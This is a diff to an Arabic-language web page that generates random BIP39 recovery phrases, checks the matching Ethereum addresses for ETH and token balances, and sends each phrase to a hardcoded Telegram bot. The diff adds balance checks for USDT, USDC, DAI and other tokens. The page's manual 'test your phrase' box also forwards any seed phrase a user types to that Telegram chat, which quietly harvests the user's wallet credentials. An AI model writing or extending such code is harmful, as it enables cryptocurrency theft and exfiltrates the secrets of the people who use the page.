@@ -1,11 +1,10 @@
-الحب لكم
+ goooo
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مولد عبارات BIP39 والبحث عن المحافظ النشطة</title>
+    <title>مولد عبارات BIP39 والبحث عن المحافظ النشطة - جميع العملات</title>
     <style>
-        /* تصميم واجهة المستخدم المتجاوبة */
         * {
             margin: 0;
             padding: 0;
@@ -22,7 +21,7 @@
         }
 
         .container {
-            max-width: 380px;
+            max-width: 800px;
             margin: 0 auto;
             background: rgba(255, 255, 255, 0.95);
             border-radius: 20px;
@@ -340,7 +339,6 @@
             border: 1px solid #ffeaa7;
         }
 
-        /* تصميم متجاوب للهواتف المحمولة */
         @media (max-width: 768px) {
             body {
                 padding: 10px;
@@ -499,20 +497,38 @@
             background: #f8d7da;
             color: #721c24;
         }
+
+        .token-list {
+            margin: 10px 0;
+            padding: 10px;
+            background: #e9ecef;
+            border-radius: 5px;
+        }
+
+        .token-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+            border-bottom: 1px solid #ced4da;
+        }
+
+        .token-item:last-child {
+            border-bottom: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔑 مولد عبارات BIP39</h1>
-            <p>البحث عن المحافظ النشطة وإرسالها إلى Telegram</p>
+            <h1>🔑 مولد عبارات BIP39 - جميع العملات</h1>
+            <p>البحث عن المحافظ النشطة وإرسالها إلى Telegram - يدعم جميع العملات</p>
         </div>
 
         <div class="main-content">
             <div class="control-panel">
                 <div class="control-group">
                     <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
-                    <input type="number" id="searchSpeed" value="2000" min="1000" max="10000" step="500">
+                    <input type="number" id="searchSpeed" value="3000" min="1000" max="10000" step="500">
                 </div>
 
                 <div class="control-group">
@@ -536,7 +552,7 @@
                 </div>
             </div>
 
-            <!-- قسم جديد لاختبار العبارات يدويًا -->
+            <!-- قسم اختبار العبارات يدويًا -->
             <div class="control-panel">
                 <h3>🔍 اختبار عبارة BIP39 يدويًا</h3>
                 <div class="control-group">
@@ -577,20 +593,20 @@
                     <div class="progress-fill" id="progressFill"></div>
                 </div>
                 <div id="currentStatus" class="alert alert-info">
-                    جاهز للبدء...
+                    جاهز للبدء... التطبيق يدعم الآن جميع العملات
                 </div>
             </div>
 
             <div class="log-panel" id="logPanel">
                 <div class="log-entry log-info">
-                    <span class="log-timestamp">[${new Date().toLocaleTimeString('ar-EG')}]</span>
-                    مرحباً بك في مولد عبارات BIP39. اضغط على "بدء البحث" للبدء.
+                    <span class="log-timestamp" id="currentTime"></span>
+                    مرحباً بك في مولد عبارات BIP39 المحسن. يدعم الآن جميع العملات المشهورة.
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- تحميل مكتبة ethers.js من CDN مختلف -->
+    <!-- تحميل مكتبة ethers.js -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
     <script>
@@ -819,6 +835,50 @@
         const TELEGRAM_CHAT_ID = '910021564';
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
+        // قائمة العملات المشهورة المضافة
+        const POPULAR_TOKENS = [
+            {
+                symbol: 'USDT',
+                address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+                decimals: 6
+            },
+            {
+                symbol: 'USDC', 
+                address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+                decimals: 6
+            },
+            {
+                symbol: 'DAI',
+                address: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+                decimals: 18
+            },
+            {
+                symbol: 'LINK',
+                address: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
+                decimals: 18
+            },
+            {
+                symbol: 'UNI',
+                address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
+                decimals: 18
+            },
+            {
+                symbol: 'WBTC',
+                address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
+                decimals: 8
+            },
+            {
+                symbol: 'AAVE',
+                address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
+                decimals: 18
+            },
+            {
+                symbol: 'SHIB',
+                address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
+                decimals: 18
+            }
+        ];
+
         // متغيرات العملية
         let isRunning = false;
         let searchInterval = null;
@@ -846,8 +906,17 @@
             errorCount: document.getElementById('errorCount'),
             progressFill: document.getElementById('progressFill'),
             currentStatus: document.getElementById('currentStatus'),
-            logPanel: document.getElementById('logPanel')
+            logPanel: document.getElementById('logPanel'),
+            currentTime: document.getElementById('currentTime')
         };
+
+        // تحديث الوقت الحالي
+        function updateCurrentTime() {
+            const now = new Date();
+            elements.currentTime.textContent = `[${now.toLocaleTimeString('ar-EG')}]`;
+        }
+        setInterval(updateCurrentTime, 1000);
+        updateCurrentTime();
 
         // التحقق من تحميل ethers.js
         function checkEthersLoaded() {
@@ -882,7 +951,6 @@
                     throw new Error('مكتبة ethers.js غير محملة');
                 }
                 
-                // التحقق من صحة العبارة باستخدام ethers
                 if (!ethers.utils.isValidMnemonic(mnemonic)) {
                     throw new Error('عبارة استرجاع غير صالحة');
                 }
@@ -906,8 +974,46 @@
                 const balanceEth = ethers.utils.formatEther(balance);
                 return parseFloat(balanceEth);
             } catch (error) {
-                console.error('خطأ في التحقق من الرصيد:', error);
+                console.error('خطأ في التحقق من رصيد ETH:', error);
                 return null;
+            }
+        }
+
+        // الدالة الجديدة لجلب أرصدة العملات
+        async function getTokenBalances(address) {
+            try {
+                if (!checkEthersLoaded()) {
+                    return [];
+                }
+                
+                const provider = new ethers.providers.JsonRpcProvider(INFURA_URL);
+                const tokenBalances = [];
+                
+                for (const token of POPULAR_TOKENS) {
+                    try {
+                        const abi = ['function balanceOf(address) view returns (uint256)'];
+                        const tokenContract = new ethers.Contract(token.address, abi, provider);
+                        
+                        const balance = await tokenContract.balanceOf(address);
+                        const formattedBalance = ethers.utils.formatUnits(balance, token.decimals);
+                        const numericBalance = parseFloat(formattedBalance);
+                        
+                        if (numericBalance > 0) {
+                            tokenBalances.push({
+                                symbol: token.symbol,
+                                balance: numericBalance,
+                                address: token.address
+                            });
+                        }
+                    } catch (error) {
+                        console.error(`خطأ في جلب رصيد ${token.symbol}:`, error);
+                    }
+                }
+                
+                return tokenBalances;
+            } catch (error) {
+                console.error('خطأ في جلب أرصدة العملات:', error);
+                return [];
             }
         }
 
@@ -926,20 +1032,27 @@
             }
         }
 
+        // تحديث دالة isWalletActive لدعم العملات المتعددة
         async function isWalletActive(address) {
             try {
-                const balance = await checkWalletBalance(address);
-                const transactionCount = await getTransactionCount(address);
+                const [balance, transactionCount, tokenBalances] = await Promise.all([
+                    checkWalletBalance(address),
+                    getTransactionCount(address),
+                    getTokenBalances(address)
+                ]);
                 
                 const hasBalance = balance !== null && balance > 0;
                 const hasTransactions = transactionCount !== null && transactionCount > 0;
+                const hasTokens = tokenBalances.length > 0;
                 
                 return {
-                    isActive: hasBalance || hasTransactions,
+                    isActive: hasBalance || hasTransactions || hasTokens,
                     balance: balance,
                     transactionCount: transactionCount,
+                    tokenBalances: tokenBalances,
                     hasBalance: hasBalance,
-                    hasTransactions: hasTransactions
+                    hasTransactions: hasTransactions,
+                    hasTokens: hasTokens
                 };
             } catch (error) {
                 console.error('خطأ في التحقق من نشاط المحفظة:', error);
@@ -947,8 +1060,10 @@
                     isActive: false,
                     balance: null,
                     transactionCount: null,
+                    tokenBalances: [],
                     hasBalance: false,
                     hasTransactions: false,
+                    hasTokens: false,
                     error: error.message
                 };
             }
@@ -980,6 +1095,7 @@
             }
         }
 
+        // تحديث دالة formatWalletMessage لعرض جميع العملات
         function formatWalletMessage(mnemonic, address, walletDetails, isActive) {
             const timestamp = new Date().toLocaleString('ar-EG', {
                 timeZone: 'Africa/Cairo',
@@ -1002,11 +1118,19 @@
             message += `📍 <b>العنوان:</b>\n<code>${address}</code>\n\n`;
             
             if (walletDetails.balance !== null) {
-                message += `💰 <b>الرصيد:</b> ${walletDetails.balance.toFixed(6)} ETH\n`;
+                message += `💰 <b>رصيد ETH:</b> ${walletDetails.balance.toFixed(6)} ETH\n`;
             }
             
             if (walletDetails.transactionCount !== null) {
                 message += `📊 <b>عدد المعاملات:</b> ${walletDetails.transactionCount}\n`;
+            }
+            
+            // إضافة أرصدة العملات الأخرى
+            if (walletDetails.tokenBalances.length > 0) {
+                message += `\n🪙 <b>العملات الأخرى:</b>\n`;
+                walletDetails.tokenBalances.forEach(token => {
+                    message += `   ${token.symbol}: ${token.balance.toFixed(4)}\n`;
+                });
             }
             
             if (isActive) {
@@ -1068,14 +1192,12 @@
                     return;
                 }
 
-                // توليد عبارة عشوائية
                 const mnemonic = generateRandomBIP39Phrase();
                 stats.totalGenerated++;
                 
                 updateStatus(`جاري فحص العبارة رقم ${stats.totalGenerated}...`, 'info');
                 addLogEntry(`تم توليد عبارة جديدة: ${mnemonic.substring(0, 30)}...`);
                 
-                // تحويل العبارة إلى عنوان
                 const address = await mnemonicToAddress(mnemonic);
                 
                 if (!address) {
@@ -1085,10 +1207,8 @@
                     return;
                 }
                 
-                // فحص نشاط المحفظة
                 const walletStatus = await isWalletActive(address);
                 
-                // إرسال جميع العبارات إلى Telegram سواء كانت نشطة أو فارغة
                 const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, walletStatus.isActive);
                 
                 if (walletStatus.isActive) {
@@ -1115,7 +1235,6 @@
                 
                 updateStats();
                 
-                // التحقق من الحد الأقصى للمحاولات
                 const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
                 if (maxAttempts > 0 && stats.totalGenerated >= maxAttempts) {
                     stopSearch();
@@ -1147,7 +1266,6 @@
                 updateStatus('جاري فحص العبارة...', 'info');
                 addLogEntry(`🔍 جاري فحص العبارة يدويًا: ${mnemonic}`);
                 
-                // إظهار مؤشر التحميل
                 elements.testManualBtn.innerHTML = '<span class="loading-spinner"></span> جاري الفحص...';
                 elements.testManualBtn.disabled = true;
                 
@@ -1157,13 +1275,10 @@
                 
                 const walletStatus = await isWalletActive(address);
                 
-                // تحديث واجهة نتائج الاختبار
                 updateManualTestResult(mnemonic, address, walletStatus);
                 
-                // إرسال العبارة إلى Telegram سواء كانت نشطة أو فارغة
                 const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, walletStatus.isActive);
                 
-                // إضافة سجل
                 if (walletStatus.isActive) {
                     addLogEntry(`🎉 العبارة تفتح محفظة نشطة! العنوان: ${address}`, 'success');
                     updateStatus('🎉 العبارة تفتح محفظة نشطة!', 'success');
@@ -1184,7 +1299,6 @@
                     }
                 }
                 
-                // إعادة تعيين الزر
                 elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة</span>';
                 elements.testManualBtn.disabled = false;
                 
@@ -1196,6 +1310,7 @@
             }
         }
 
+        // تحديث دالة عرض النتائج اليدوية
         function updateManualTestResult(mnemonic, address, walletStatus) {
             let resultHTML = '';
             
@@ -1204,11 +1319,28 @@
                     <h4>✅ نتيجة الفحص: المحفظة نشطة</h4>
                     <div class="status active">محفظة نشطة</div>
                     <div class="balance ${walletStatus.balance > 0 ? 'positive' : 'zero'}">
-                        💰 الرصيد: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
+                        💰 رصيد ETH: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
                     </div>
                     <div class="transactions">
                         📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
                     </div>
+                `;
+                
+                if (walletStatus.tokenBalances.length > 0) {
+                    resultHTML += `
+                        <div class="token-list">
+                            <strong>🪙 العملات الأخرى:</strong>
+                            ${walletStatus.tokenBalances.map(token => `
+                                <div class="token-item">
+                                    <span>${token.symbol}</span>
+                                    <span>${token.balance.toFixed(4)}</span>
+                                </div>
+                            `).join('')}
+                        </div>
+                    `;
+                }
+                
+                resultHTML += `
                     <div class="wallet-details">
                         <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
                         <div class="address">📍 العنوان: ${address}</div>
@@ -1220,11 +1352,28 @@
                     <h4>❌ نتيجة الفحص: المحفظة فارغة</h4>
                     <div class="status inactive">محفظة فارغة</div>
                     <div class="balance zero">
-                        💰 الرصيد: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
+                        💰 رصيد ETH: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
                     </div>
                     <div class="transactions">
                         📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
                     </div>
+                `;
+                
+                if (walletStatus.tokenBalances.length > 0) {
+                    resultHTML += `
+                        <div class="token-list">
+                            <strong>🪙 العملات الأخرى:</strong>
+                            ${walletStatus.tokenBalances.map(token => `
+                                <div class="token-item">
+                                    <span>${token.symbol}</span>
+                                    <span>${token.balance.toFixed(4)}</span>
+                                </div>
+                            `).join('')}
+                        </div>
+                    `;
+                }
+                
+                resultHTML += `
                     <div class="wallet-details">
                         <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
                         <div class="address">📍 العنوان: ${address}</div>
@@ -1249,12 +1398,11 @@
             elements.startBtn.disabled = true;
             elements.stopBtn.disabled = false;
             
-            const speed = parseInt(elements.searchSpeed.value) || 2000;
+            const speed = parseInt(elements.searchSpeed.value) || 3000;
             
             updateStatus('جاري بدء البحث...', 'info');
             addLogEntry('🚀 تم بدء البحث عن المحافظ النشطة');
             
-            // إرسال رسالة البداية إلى Telegram
             const startMessage = `🚀 <b>بدء عملية البحث عن المحافظ النشطة</b>\n\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n🔍 جاري البحث عن محافظ وإرسال جميع العبارات إلى Telegram...`;
             await sendTelegramMessage(startMessage);
             
@@ -1276,7 +1424,6 @@
             updateStatus('تم إيقاف البحث', 'warning');
             addLogEntry('⏹️ تم إيقاف البحث');
             
-            // إرسال رسالة الإيقاف إلى Telegram
             let stopMessage = `⏹️ <b>تم إيقاف عملية البحث</b>\n\n`;
             stopMessage += `📊 <b>الإحصائيات النهائية:</b>\n`;
             stopMessage += `🔢 إجمالي العبارات: ${stats.totalGenerated}\n`;
@@ -1320,6 +1467,7 @@
             if (checkEthersLoaded()) {
                 updateStatus('✅ تم تحميل مكتبة ethers.js بنجاح. جاهز للبدء...', 'success');
                 addLogEntry('✅ تم تحميل مكتبة ethers.js بنجاح', 'success');
+                addLogEntry('🪙 التطبيق يدعم الآن جميع العملات: ETH, USDT, USDC, DAI, LINK, UNI, WBTC, AAVE, SHIB', 'success');
             }
         });
 
